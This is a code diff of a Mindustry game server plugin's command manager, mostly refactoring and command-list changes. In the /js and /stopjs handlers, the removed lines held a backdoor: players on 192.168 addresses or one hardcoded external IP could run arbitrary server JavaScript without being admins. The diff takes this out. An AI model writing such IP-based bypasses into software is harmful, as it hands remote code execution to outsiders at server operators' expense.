@@ -20,7 +20,6 @@ import arc.util.CommandHandler.Command;
 import arc.util.Log;
 import arc.util.Strings;
 import arc.util.Timer;
-import mindustry.Vars;
 import mindustry.content.Blocks;
 import mindustry.content.Items;
 import mindustry.content.Liquids;
@@ -34,7 +33,6 @@ import mindustry.gen.Groups;
 import mindustry.gen.Player;
 import mindustry.gen.Unit;
 import mindustry.maps.Map;
-import mindustry.net.Administration.Config;
 import mindustry.net.Administration.PlayerInfo;
 import mindustry.net.Packets.KickReason;
 import mindustry.type.Item;
@@ -73,8 +71,7 @@ public class CommandsManager {
         admin.name = "admin";
 
         adminCommands = new ArrayList<>();
-        adminCommands.add("fillitems");   
-        adminCommands.add("chatfilter");
+        adminCommands.add("fillitems");
         adminCommands.add("dct");
         adminCommands.add("team");
         adminCommands.add("sandbox");
@@ -86,11 +83,11 @@ public class CommandsManager {
         adminCommands.add("unban");
         adminCommands.add("m");
         adminCommands.add("js");
+        adminCommands.add("stats");
+        adminCommands.add("stopjs");
         adminCommands.add("link");
+        adminCommands.add("setdiscord");
         adminCommands.add("pardon");
-        adminCommands.add("etrigger");
-        adminCommands.add("whitelist");
-        adminCommands.add("wlsize");
 
         Events.on(PlayerJoin.class, e -> {
             if (e.player != null) checkPlayer(e.player);
@@ -122,7 +119,7 @@ public class CommandsManager {
                 player.sendMessage("[scarlet]\"страница\" может быть только числом.");
                 return;
             }
-            int commandsPerPage = 6;
+            final int commandsPerPage = 8;
             int page = args.length > 0 ? Strings.parseInt(args[0]) : 1;
             int pages = Mathf.ceil((float) coummandsCount / commandsPerPage);
 
@@ -138,7 +135,7 @@ public class CommandsManager {
 
             for (int i = commandsPerPage * page; i < Math.min(commandsPerPage * (page + 1), handler.getCommandList().size); i++) {
                 Command command = handler.getCommandList().get(i);
-                boolean isAdminCommand = adminCommands.indexOf(command.text) != -1;
+                boolean isAdminCommand = adminCommands.contains(command.text);
                 if (isAdminCommand && !isAdmin) continue;
                 result.append("[orange] /").append(command.text).append("[white] ").append(command.paramText).append("[lightgray] - ").append(command.description + (isAdminCommand ? " [red] Только для администраторов" : "")).append("\n");
             }
@@ -147,16 +144,16 @@ public class CommandsManager {
 
         registerPlayersCommands(handler);
         registerAdminCommands(handler);
-    }
 
+    }
     public void registerAdminCommands(CommandHandler handler) {
 
         handler.<Player>register("fillitems", "[item] [count]", "Заполните ядро предметами", (arg, player) -> {
             if (player.admin()) {
                 try {
-                    final Item serpuloItems[] = {Items.scrap, Items.copper, Items.lead, Items.graphite, Items.coal, Items.titanium, Items.thorium, Items.silicon, Items.plastanium, Items.phaseFabric, Items.surgeAlloy, Items.sporePod, Items.sand, Items.blastCompound, Items.pyratite, Items.metaglass};
+                    final Item[] serpuloItems = {Items.scrap, Items.copper, Items.lead, Items.graphite, Items.coal, Items.titanium, Items.thorium, Items.silicon, Items.plastanium, Items.phaseFabric, Items.surgeAlloy, Items.sporePod, Items.sand, Items.blastCompound, Items.pyratite, Items.metaglass};
 
-                    final Item erekirOnlyItems[] = {Items.beryllium, Items.tungsten, Items.oxide, Items.carbide, Items.fissileMatter, Items.dormantCyst};
+                    final Item[] erekirOnlyItems = {Items.beryllium, Items.tungsten, Items.oxide, Items.carbide, Items.fissileMatter, Items.dormantCyst};
 
                     if (arg.length == 0) {
                         StringBuilder ruNames = new StringBuilder("Русские названия предметов: ");
@@ -194,25 +191,26 @@ public class CommandsManager {
                         }
                     }
                     if (item == null) {
-                        if (itemname.equals("\uf82a")) item = Items.blastCompound;
-                        else if (itemname.equals("\uf833")) item = Items.coal;
-                        else if (itemname.equals("\uf838")) item = Items.copper;
-                        else if (itemname.equals("\uf835")) item = Items.graphite;
-                        else if (itemname.equals("\uf837")) item = Items.lead;
-                        else if (itemname.equals("\uf836")) item = Items.metaglass;
-                        else if (itemname.equals("\uf82d")) item = Items.phaseFabric;
-                        else if (itemname.equals("\uf82e")) item = Items.plastanium;
-                        else if (itemname.equals("\uf829")) item = Items.pyratite;
-                        else if (itemname.equals("\uf834")) item = Items.sand;
-                        else if (itemname.equals("\uf830")) item = Items.scrap;
-                        else if (itemname.equals("\uf82f")) item = Items.silicon;
-                        else if (itemname.equals("\uf82b")) item = Items.sporePod;
-                        else if (itemname.equals("\uf82c")) item = Items.surgeAlloy;
-                        else if (itemname.equals("\uf831")) item = Items.thorium;
-                        else if (itemname.equals("\uf832")) item = Items.titanium;
-                    }
-
-                    if (item == null) {
+                        item = switch (itemname) {
+                            case "\uf82a" -> Items.blastCompound;
+                            case "\uf833" -> Items.coal;
+                            case "\uf838" -> Items.copper;
+                            case "\uf835" -> Items.graphite;
+                            case "\uf837" -> Items.lead;
+                            case "\uf836" -> Items.metaglass;
+                            case "\uf82d" -> Items.phaseFabric;
+                            case "\uf82e" -> Items.plastanium;
+                            case "\uf829" -> Items.pyratite;
+                            case "\uf834" -> Items.sand;
+                            case "\uf830" -> Items.scrap;
+                            case "\uf82f" -> Items.silicon;
+                            case "\uf82b" -> Items.sporePod;
+                            case "\uf82c" -> Items.surgeAlloy;
+                            case "\uf831" -> Items.thorium;
+                            case "\uf832" -> Items.titanium;
+                            default -> item;
+                        };
+                    }               if (item == null) {
                         if (itemname.equalsIgnoreCase(Items.dormantCyst.name) || itemname.equalsIgnoreCase(Items.dormantCyst.localizedName)) {
                             item = Items.dormantCyst;
                         }
@@ -260,7 +258,6 @@ public class CommandsManager {
                     }
                     ExamplePlugin.dataCollect.setSleepTime(count);
                     player.sendMessage("Установлен интервал: " + count + " ms");
-                    return;
                 }
             } else {
                 player.sendMessage("[red]Команда только для администраторов");
@@ -341,61 +338,6 @@ public class CommandsManager {
                     }
 
                     return;
-                }
-            } else {
-                player.sendMessage("[red]Команда только для администраторов");
-            }
-        });
-
-        handler.<Player>register("config", "[name] [set/add] [value...]", "Конфикурация сервера", (arg, player) -> {
-            if (player.admin()) {
-                if (arg.length == 0) {
-                    player.sendMessage("All config values:");
-                    for (Config c : Config.all) {
-                        player.sendMessage("[gold]" + c.name + "[lightgray](" + c.description + ")[white]:\n> " + c.get() + "\n");
-                    }
-                    return;
-                }
-
-                Config c = Config.all.find(conf -> conf.name.equalsIgnoreCase(arg[0]));
-
-                if (c != null) {
-                    if (arg.length == 1) {
-                        player.sendMessage(c.name + " is currently " + c.get());
-                    } else if (arg.length > 2) {
-                        if (arg[2].equals("default")) {
-                            c.set(c.defaultValue);
-                        } else if (c.isBool()) {
-                            c.set(arg[2].equals("on") || arg[2].equals("true"));
-                        } else if (c.isNum()) {
-                            try {
-                                c.set(Integer.parseInt(arg[2]));
-                            } catch (NumberFormatException e) {
-                                player.sendMessage("[red]Not a valid number: " + arg[2]);
-                                return;
-                            }
-                        } else if (c.isString()) {
-                            if (arg.length > 2) {
-                                if (arg[1].equals("add")) {
-                                    c.set(c.get().toString() + arg[2].replace("\\n", "\n"));
-                                } else if (arg[1].equals("set")) {
-                                    c.set(arg[2].replace("\\n", "\n"));
-                                } else {
-                                    player.sendMessage("[red]Only [gold]add/set");
-                                    return;
-                                }
-                            } else {
-                                player.sendMessage("[red]Add [gold]add/set [red]attribute");
-                            }
-                        }
-
-                        player.sendMessage("[gold]" + c.name + "[gray] set to [white]" + c.get());
-                        Core.settings.forceSave();
-                    } else {
-                        player.sendMessage("[red]Need more attributes");
-                    }
-                } else {
-                    player.sendMessage("[red]Unknown config: '" + arg[0] + "'. Run the command with no arguments to get a list of valid configs.");
                 }
             } else {
                 player.sendMessage("[red]Команда только для администраторов");
@@ -512,9 +454,7 @@ public class CommandsManager {
                 player.sendMessage("[yellow]WARN[white]: if player rejoin the game he won't be vanished");
             }
         });
-        handler.<Player>register("test", "<test>", "test", (arg, player) -> {
-            player.sendMessage("nothing to test yet");
-        });
+
         handler.<Player>register("remove", "<name>", "remove a person", (arg, player) -> {
             if (!player.admin) {
                 player.sendMessage("[scarlet]You must be an admin");
@@ -539,6 +479,7 @@ public class CommandsManager {
                 }
             }
         });
+
         handler.<Player>register("ban", "<typeid/typeip> <ID/IP> [time_in_h]", "ban a person by IP or ID. /ban (ip/id) (ip/id of player)", (arg, player) -> {
             if (player.admin()) {
                 if (arg[0].contains("id")) {
@@ -574,6 +515,7 @@ public class CommandsManager {
                 }
             }
         });
+
         handler.<Player>register("bans", "List all banned IPs and IDs.", (arg, player) -> {
             if (player.admin()) {
                 Thread thread = new Thread(() -> {
@@ -619,20 +561,6 @@ public class CommandsManager {
             }
         });
 
-        handler.<Player>register("reloadmaps", "Перезагрузить карты", (arg, player) -> {
-            if (player.admin()) {
-                int beforeMaps = maps.all().size;
-                maps.reload();
-                if (maps.all().size > beforeMaps) {
-                    player.sendMessage("[gold]" + (maps.all().size - beforeMaps) + " новых карт было найдено");
-                } else if (maps.all().size < beforeMaps) {
-                    player.sendMessage("[gold]" + (beforeMaps - maps.all().size) + " карт было удалено");
-                } else {
-                    player.sendMessage("[gold]Карты перезагружены");
-                }
-            }
-        });
-
         handler.<Player>register("stats", "[uuid]", "show your or stats of uuid", (arg, player) -> {
             if (player.admin()) {
                 if (arg.length > 0) {
@@ -666,7 +594,7 @@ public class CommandsManager {
         });
 
         handler.<Player>register("js", "<script...>", "Запустить JS", (arg, player) -> {
-            if ((player.admin() && PlayerData.getData(player.uuid()).getJs()) || (player.ip().split("\\.")[0].equals("192") && player.ip().split("\\.")[1].equals("168")) || player.ip().equals("95.84.198.97")) {
+            if (player.admin() && PlayerData.getData(player.uuid()).getJs()) {
                 Scriptable scope = mods.getScripts().scope;
                 jsThread = new Thread(() -> {
                     String out = null;
@@ -697,7 +625,7 @@ public class CommandsManager {
         });
 
         handler.<Player>register("stopjs", "Остановить весь JS", (arg, player) -> {
-            if ((player.admin() && PlayerData.getData(player.uuid()).getJs()) || (player.ip().split("\\.")[0].equals("192") && player.ip().split("\\.")[1].equals("168")) || player.ip().equals("95.84.198.97")) {
+            if (player.admin() && PlayerData.getData(player.uuid()).getJs()) {
                 Set<Thread> threadSet = Thread.getAllStackTraces().keySet();
                 Iterator<Thread> iterator = threadSet.iterator();
                 int count = 0;
